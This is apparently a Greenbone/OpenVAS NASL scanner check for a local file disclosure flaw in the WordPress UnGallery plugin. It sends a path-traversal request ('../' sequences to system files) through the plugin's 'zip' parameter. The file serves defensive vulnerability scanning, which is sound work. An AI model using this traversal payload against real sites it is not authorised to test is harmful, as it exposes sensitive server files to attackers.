CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103221" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-08-23 15:25:10 +0200 (Tue, 23 Aug 2011)" );
	script_bugtraq_id( 49271 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "WordPress UnGallery 'zip' Parameter Local File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49271" );
	script_xref( name: "URL", value: "http://plugins.trac.wordpress.org/changeset?reponame=&new=400553%40ungallery&old=397601%40ungallery" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/ungallery/changelog/" );
	script_tag( name: "summary", value: "The UnGallery plug-in for WordPress is prone to a local file-
  disclosure vulnerability because it fails to adequately validate user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on computers
  running the vulnerable application. This may aid in further attacks." );
	script_tag( name: "affected", value: "Versions prior to UnGallery 1.5.8 are vulnerable." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/wp-content/plugins/ungallery/source.php?zip=", crap( data: "../", length: 3 * 9 ), files[file] );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

